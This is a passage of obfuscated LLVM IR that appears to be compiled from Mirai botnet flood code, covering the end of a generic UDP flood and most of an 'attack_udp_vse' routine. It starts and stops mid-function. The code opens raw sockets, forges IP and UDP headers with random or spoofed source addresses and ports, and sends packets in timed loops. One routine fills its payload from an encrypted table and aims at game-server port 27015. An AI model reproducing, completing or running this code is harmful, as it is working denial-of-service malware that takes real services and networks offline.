  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 24, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = sub i64 0, %73
  %75 = sub i64 %71, %74
  %76 = add nsw i64 %71, %73
  %77 = trunc i64 %75 to i32
  store i32 %77, i32* %23, align 4
  %78 = load i16, i16* %20, align 2
  %79 = zext i16 %78 to i32
  %80 = icmp sgt i32 %79, 1460
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %82

; <label>:82:                                     ; preds = %81, %5
  %83 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %83, i32* %12, align 4
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %82
  br label %398

; <label>:86:                                     ; preds = %82
  store i32 1, i32* %11, align 4
  %87 = load i32, i32* %12, align 4
  %88 = bitcast i32* %11 to i8*
  %89 = call i32 @setsockopt(i32 %87, i32 0, i32 3, i8* %88, i32 4) #6
  %90 = icmp eq i32 %89, -1
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %86
  %92 = load i32, i32* %12, align 4
  %93 = call i32 @close(i32 %92)
  br label %398

; <label>:94:                                     ; preds = %86
  store i32 0, i32* %11, align 4
  br label %95

; <label>:95:                                     ; preds = %228, %94
  %96 = load i32, i32* %11, align 4
  %97 = load i8, i8* %7, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp slt i32 %96, %98
  br i1 %99, label %100, label %235

; <label>:100:                                    ; preds = %95
  %101 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %102 = load i8**, i8*** %13, align 8
  %103 = load i32, i32* %11, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8*, i8** %102, i64 %104
  store i8* %101, i8** %105, align 8
  %106 = load i8**, i8*** %13, align 8
  %107 = load i32, i32* %11, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8*, i8** %106, i64 %108
  %110 = load i8*, i8** %109, align 8
  %111 = bitcast i8* %110 to %struct.iphdr*
  store %struct.iphdr* %111, %struct.iphdr** %24, align 8
  %112 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i64 1
  %114 = bitcast %struct.iphdr* %113 to %struct.udphdr*
  store %struct.udphdr* %114, %struct.udphdr** %25, align 8
  %115 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %116 = bitcast %struct.iphdr* %115 to i8*
  %117 = load i8, i8* %116, align 4
  %118 = xor i8 %117, -1
  %119 = xor i8 15, -1
  %120 = xor i8 23, -1
  %121 = or i8 %118, %119
  %122 = or i8 23, %120
  %123 = xor i8 %121, -1
  %124 = and i8 %123, %122
  %125 = and i8 %117, 15
  %126 = xor i8 %124, -1
  %127 = xor i8 64, -1
  %128 = xor i8 87, -1
  %129 = and i8 %126, 87
  %130 = and i8 %124, %128
  %131 = and i8 %127, 87
  %132 = and i8 64, %128
  %133 = or i8 %129, %130
  %134 = or i8 %131, %132
  %135 = xor i8 %133, %134
  %136 = or i8 %126, %127
  %137 = xor i8 %136, -1
  %138 = or i8 87, %128
  %139 = and i8 %137, %138
  %140 = or i8 %135, %139
  %141 = or i8 %124, 64
  store i8 %140, i8* %116, align 4
  %142 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %143 = bitcast %struct.iphdr* %142 to i8*
  %144 = load i8, i8* %143, align 4
  %145 = xor i8 %144, -1
  %146 = xor i8 -16, -1
  %147 = xor i8 75, -1
  %148 = or i8 %145, %146
  %149 = or i8 75, %147
  %150 = xor i8 %148, -1
  %151 = and i8 %150, %149
  %152 = and i8 %144, -16
  %153 = xor i8 %151, -1
  %154 = xor i8 5, -1
  %155 = xor i8 114, -1
  %156 = and i8 %153, 114
  %157 = and i8 %151, %155
  %158 = and i8 %154, 114
  %159 = and i8 5, %155
  %160 = or i8 %156, %157
  %161 = or i8 %158, %159
  %162 = xor i8 %160, %161
  %163 = or i8 %153, %154
  %164 = xor i8 %163, -1
  %165 = or i8 114, %155
  %166 = and i8 %164, %165
  %167 = or i8 %162, %166
  %168 = or i8 %151, 5
  store i8 %167, i8* %143, align 4
  %169 = load i8, i8* %14, align 1
  %170 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 1
  store i8 %169, i8* %171, align 1
  %172 = load i16, i16* %20, align 2
  %173 = zext i16 %172 to i64
  %174 = add i64 28, 894012493959863153
  %175 = add i64 %174, %173
  %176 = sub i64 %175, 894012493959863153
  %177 = add i64 28, %173
  %178 = trunc i64 %176 to i16
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 2
  store i16 %179, i16* %181, align 2
  %182 = load i16, i16* %15, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 3
  store i16 %183, i16* %185, align 4
  %186 = load i8, i8* %16, align 1
  %187 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 5
  store i8 %186, i8* %188, align 4
  %189 = load i8, i8* %17, align 1
  %190 = icmp ne i8 %189, 0
  br i1 %190, label %191, label %195

; <label>:191:                                    ; preds = %100
  %192 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 4
  store i16 %192, i16* %194, align 2
  br label %195

; <label>:195:                                    ; preds = %191, %100
  %196 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 6
  store i8 17, i8* %197, align 1
  %198 = load i32, i32* %22, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 8
  store i32 %198, i32* %200, align 4
  %201 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %202 = load i32, i32* %11, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i32 0, i32 1
  %206 = load i32, i32* %205, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 9
  store i32 %206, i32* %208, align 4
  %209 = load i16, i16* %18, align 2
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 0
  store i16 %210, i16* %212, align 2
  %213 = load i16, i16* %19, align 2
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %216 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %215, i32 0, i32 1
  store i16 %214, i16* %216, align 2
  %217 = load i16, i16* %20, align 2
  %218 = zext i16 %217 to i64
  %219 = sub i64 0, 8
  %220 = sub i64 0, %218
  %221 = add i64 %219, %220
  %222 = sub i64 0, %221
  %223 = add i64 8, %218
  %224 = trunc i64 %222 to i16
  %225 = call zeroext i16 @htons(i16 zeroext %224) #7
  %226 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 2
  store i16 %225, i16* %227, align 2
  br label %228

; <label>:228:                                    ; preds = %195
  %229 = load i32, i32* %11, align 4
  %230 = sub i32 0, %229
  %231 = sub i32 0, 1
  %232 = add i32 %230, %231
  %233 = sub i32 0, %232
  %234 = add nsw i32 %229, 1
  store i32 %233, i32* %11, align 4
  br label %95

; <label>:235:                                    ; preds = %95
  br label %236

; <label>:236:                                    ; preds = %397, %235
  store i32 0, i32* %11, align 4
  br label %237

; <label>:237:                                    ; preds = %385, %236
  %238 = load i32, i32* %11, align 4
  %239 = load i8, i8* %7, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp slt i32 %238, %240
  br i1 %241, label %242, label %391

; <label>:242:                                    ; preds = %237
  %243 = load i8**, i8*** %13, align 8
  %244 = load i32, i32* %11, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds i8*, i8** %243, i64 %245
  %247 = load i8*, i8** %246, align 8
  store i8* %247, i8** %26, align 8
  %248 = load i8*, i8** %26, align 8
  %249 = bitcast i8* %248 to %struct.iphdr*
  store %struct.iphdr* %249, %struct.iphdr** %27, align 8
  %250 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i64 1
  %252 = bitcast %struct.iphdr* %251 to %struct.udphdr*
  store %struct.udphdr* %252, %struct.udphdr** %28, align 8
  %253 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i64 1
  %255 = bitcast %struct.udphdr* %254 to i8*
  store i8* %255, i8** %29, align 8
  %256 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %257 = load i32, i32* %11, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i32 0, i32 2
  %261 = load i8, i8* %260, align 4
  %262 = zext i8 %261 to i32
  %263 = icmp slt i32 %262, 32
  br i1 %263, label %264, label %287

; <label>:264:                                    ; preds = %242
  %265 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %266 = load i32, i32* %11, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i64 %267
  %269 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %268, i32 0, i32 1
  %270 = load i32, i32* %269, align 4
  %271 = call i32 @ntohl(i32 %270) #7
  %272 = call i32 @rand_next()
  %273 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %274 = load i32, i32* %11, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %276, i32 0, i32 2
  %278 = load i8, i8* %277, align 4
  %279 = zext i8 %278 to i32
  %280 = lshr i32 %272, %279
  %281 = sub i32 0, %280
  %282 = sub i32 %271, %281
  %283 = add i32 %271, %280
  %284 = call i32 @htonl(i32 %282) #7
  %285 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 9
  store i32 %284, i32* %286, align 4
  br label %287

; <label>:287:                                    ; preds = %264, %242
  %288 = load i32, i32* %22, align 4
  %289 = icmp eq i32 %288, -1
  br i1 %289, label %290, label %294

; <label>:290:                                    ; preds = %287
  %291 = call i32 @rand_next()
  %292 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %293 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %292, i32 0, i32 8
  store i32 %291, i32* %293, align 4
  br label %294

; <label>:294:                                    ; preds = %290, %287
  %295 = load i16, i16* %15, align 2
  %296 = zext i16 %295 to i32
  %297 = icmp eq i32 %296, 65535
  br i1 %297, label %298, label %303

; <label>:298:                                    ; preds = %294
  %299 = call i32 @rand_next()
  %300 = trunc i32 %299 to i16
  %301 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 3
  store i16 %300, i16* %302, align 4
  br label %303

; <label>:303:                                    ; preds = %298, %294
  %304 = load i16, i16* %18, align 2
  %305 = zext i16 %304 to i32
  %306 = icmp eq i32 %305, 65535
  br i1 %306, label %307, label %312

; <label>:307:                                    ; preds = %303
  %308 = call i32 @rand_next()
  %309 = trunc i32 %308 to i16
  %310 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %311 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %310, i32 0, i32 0
  store i16 %309, i16* %311, align 2
  br label %312

; <label>:312:                                    ; preds = %307, %303
  %313 = load i16, i16* %19, align 2
  %314 = zext i16 %313 to i32
  %315 = icmp eq i32 %314, 65535
  br i1 %315, label %316, label %321

; <label>:316:                                    ; preds = %312
  %317 = call i32 @rand_next()
  %318 = trunc i32 %317 to i16
  %319 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %320 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %319, i32 0, i32 1
  store i16 %318, i16* %320, align 2
  br label %321

; <label>:321:                                    ; preds = %316, %312
  %322 = load i8, i8* %21, align 1
  %323 = icmp ne i8 %322, 0
  br i1 %323, label %324, label %332

; <label>:324:                                    ; preds = %321
  %325 = load i8*, i8** %29, align 8
  %326 = load i16, i16* %20, align 2
  %327 = zext i16 %326 to i32
  call void @rand_alphastr(i8* %325, i32 %327)
  %328 = load i8*, i8** %29, align 8
  %329 = load i16, i16* %20, align 2
  %330 = zext i16 %329 to i64
  %331 = getelementptr inbounds i8, i8* %328, i64 %330
  store i8 0, i8* %331, align 1
  br label %332

; <label>:332:                                    ; preds = %324, %321
  %333 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 7
  store i16 0, i16* %334, align 2
  %335 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %336 = bitcast %struct.iphdr* %335 to i16*
  %337 = call zeroext i16 @checksum_generic(i16* %336, i32 20)
  %338 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i32 0, i32 7
  store i16 %337, i16* %339, align 2
  %340 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 3
  store i16 0, i16* %341, align 2
  %342 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %343 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %344 = bitcast %struct.udphdr* %343 to i8*
  %345 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %346 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %345, i32 0, i32 2
  %347 = load i16, i16* %346, align 2
  %348 = load i16, i16* %20, align 2
  %349 = zext i16 %348 to i64
  %350 = sub i64 0, 8
  %351 = sub i64 0, %349
  %352 = add i64 %350, %351
  %353 = sub i64 0, %352
  %354 = add i64 8, %349
  %355 = trunc i64 %353 to i32
  %356 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %342, i8* %344, i16 zeroext %347, i32 %355)
  %357 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %358 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %357, i32 0, i32 3
  store i16 %356, i16* %358, align 2
  %359 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i32 0, i32 1
  %361 = load i16, i16* %360, align 2
  %362 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %363 = load i32, i32* %11, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i64 %364
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i32 0, i32 0
  %367 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %366, i32 0, i32 1
  store i16 %361, i16* %367, align 2
  %368 = load i32, i32* %12, align 4
  %369 = load i8*, i8** %26, align 8
  %370 = load i16, i16* %20, align 2
  %371 = zext i16 %370 to i64
  %372 = sub i64 0, %371
  %373 = sub i64 28, %372
  %374 = add i64 28, %371
  %375 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %376 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %377 = load i32, i32* %11, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i32 0, i32 0
  %381 = bitcast %struct.sockaddr_in* %380 to %struct.sockaddr*
  store %struct.sockaddr* %381, %struct.sockaddr** %375, align 8
  %382 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %383 = load %struct.sockaddr*, %struct.sockaddr** %382, align 8
  %384 = call i64 @sendto(i32 %368, i8* %369, i64 %373, i32 16384, %struct.sockaddr* %383, i32 16)
  br label %385

; <label>:385:                                    ; preds = %332
  %386 = load i32, i32* %11, align 4
  %387 = sub i32 %386, 137330881
  %388 = add i32 %387, 1
  %389 = add i32 %388, 137330881
  %390 = add nsw i32 %386, 1
  store i32 %389, i32* %11, align 4
  br label %237

; <label>:391:                                    ; preds = %237
  %392 = call i64 @time(i64* null) #6
  %393 = load i32, i32* %23, align 4
  %394 = sext i32 %393 to i64
  %395 = icmp sgt i64 %392, %394
  br i1 %395, label %396, label %397

; <label>:396:                                    ; preds = %391
  br label %398

; <label>:397:                                    ; preds = %391
  br label %236

; <label>:398:                                    ; preds = %396, %91, %85
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 %58, -5882462963074314566
  %62 = add i64 %61, %60
  %63 = add i64 %62, -5882462963074314566
  %64 = add nsw i64 %58, %60
  %65 = trunc i64 %63 to i32
  store i32 %65, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %66 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %66, i8** %20, align 8
  %67 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %67, i32* %12, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %5
  br label %339

; <label>:70:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %71 = load i32, i32* %12, align 4
  %72 = bitcast i32* %11 to i8*
  %73 = call i32 @setsockopt(i32 %71, i32 0, i32 3, i8* %72, i32 4) #6
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %78

; <label>:75:                                     ; preds = %70
  %76 = load i32, i32* %12, align 4
  %77 = call i32 @close(i32 %76)
  br label %339

; <label>:78:                                     ; preds = %70
  store i32 0, i32* %11, align 4
  br label %79

; <label>:79:                                     ; preds = %189, %78
  %80 = load i32, i32* %11, align 4
  %81 = load i8, i8* %7, align 1
  %82 = zext i8 %81 to i32
  %83 = icmp slt i32 %80, %82
  br i1 %83, label %84, label %196

; <label>:84:                                     ; preds = %79
  %85 = call noalias i8* @calloc(i64 128, i64 1) #6
  %86 = load i8**, i8*** %13, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8*, i8** %86, i64 %88
  store i8* %85, i8** %89, align 8
  %90 = load i8**, i8*** %13, align 8
  %91 = load i32, i32* %11, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8*, i8** %90, i64 %92
  %94 = load i8*, i8** %93, align 8
  %95 = bitcast i8* %94 to %struct.iphdr*
  store %struct.iphdr* %95, %struct.iphdr** %23, align 8
  %96 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i64 1
  %98 = bitcast %struct.iphdr* %97 to %struct.udphdr*
  store %struct.udphdr* %98, %struct.udphdr** %24, align 8
  %99 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %100 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %99, i64 1
  %101 = bitcast %struct.udphdr* %100 to i8*
  store i8* %101, i8** %25, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %103 = bitcast %struct.iphdr* %102 to i8*
  %104 = load i8, i8* %103, align 4
  %105 = xor i8 15, -1
  %106 = xor i8 %104, %105
  %107 = and i8 %106, %104
  %108 = and i8 %104, 15
  %109 = and i8 %107, 64
  %110 = xor i8 %107, 64
  %111 = or i8 %109, %110
  %112 = or i8 %107, 64
  store i8 %111, i8* %103, align 4
  %113 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %114 = bitcast %struct.iphdr* %113 to i8*
  %115 = load i8, i8* %114, align 4
  %116 = xor i8 -16, -1
  %117 = xor i8 %115, %116
  %118 = and i8 %117, %115
  %119 = and i8 %115, -16
  %120 = and i8 %118, 5
  %121 = xor i8 %118, 5
  %122 = or i8 %120, %121
  %123 = or i8 %118, 5
  store i8 %122, i8* %114, align 4
  %124 = load i8, i8* %14, align 1
  %125 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 1
  store i8 %124, i8* %126, align 1
  %127 = load i32, i32* %21, align 4
  %128 = sext i32 %127 to i64
  %129 = sub i64 32, -4172328212310794776
  %130 = add i64 %129, %128
  %131 = add i64 %130, -4172328212310794776
  %132 = add i64 32, %128
  %133 = trunc i64 %131 to i16
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %15, align 2
  %138 = call zeroext i16 @htons(i16 zeroext %137) #7
  %139 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 3
  store i16 %138, i16* %140, align 4
  %141 = load i8, i8* %16, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 5
  store i8 %141, i8* %143, align 4
  %144 = load i8, i8* %17, align 1
  %145 = icmp ne i8 %144, 0
  br i1 %145, label %146, label %150

; <label>:146:                                    ; preds = %84
  %147 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 4
  store i16 %147, i16* %149, align 2
  br label %150

; <label>:150:                                    ; preds = %146, %84
  %151 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 6
  store i8 17, i8* %152, align 1
  %153 = load i32, i32* @LOCAL_ADDR, align 4
  %154 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 8
  store i32 %153, i32* %155, align 4
  %156 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %157 = load i32, i32* %11, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 1
  %161 = load i32, i32* %160, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 9
  store i32 %161, i32* %163, align 4
  %164 = load i16, i16* %18, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 0
  store i16 %165, i16* %167, align 2
  %168 = load i16, i16* %19, align 2
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %171 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %170, i32 0, i32 1
  store i16 %169, i16* %171, align 2
  %172 = load i32, i32* %21, align 4
  %173 = sext i32 %172 to i64
  %174 = add i64 12, -2169212008741397217
  %175 = add i64 %174, %173
  %176 = sub i64 %175, -2169212008741397217
  %177 = add i64 12, %173
  %178 = trunc i64 %176 to i16
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %181 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %180, i32 0, i32 2
  store i16 %179, i16* %181, align 2
  %182 = load i8*, i8** %25, align 8
  %183 = bitcast i8* %182 to i32*
  store i32 -1, i32* %183, align 4
  %184 = load i8*, i8** %25, align 8
  %185 = getelementptr inbounds i8, i8* %184, i64 4
  store i8* %185, i8** %25, align 8
  %186 = load i8*, i8** %25, align 8
  %187 = load i8*, i8** %20, align 8
  %188 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %186, i8* %187, i32 %188)
  br label %189

; <label>:189:                                    ; preds = %150
  %190 = load i32, i32* %11, align 4
  %191 = sub i32 0, %190
  %192 = sub i32 0, 1
  %193 = add i32 %191, %192
  %194 = sub i32 0, %193
  %195 = add nsw i32 %190, 1
  store i32 %194, i32* %11, align 4
  br label %79

; <label>:196:                                    ; preds = %79
  br label %197

; <label>:197:                                    ; preds = %338, %196
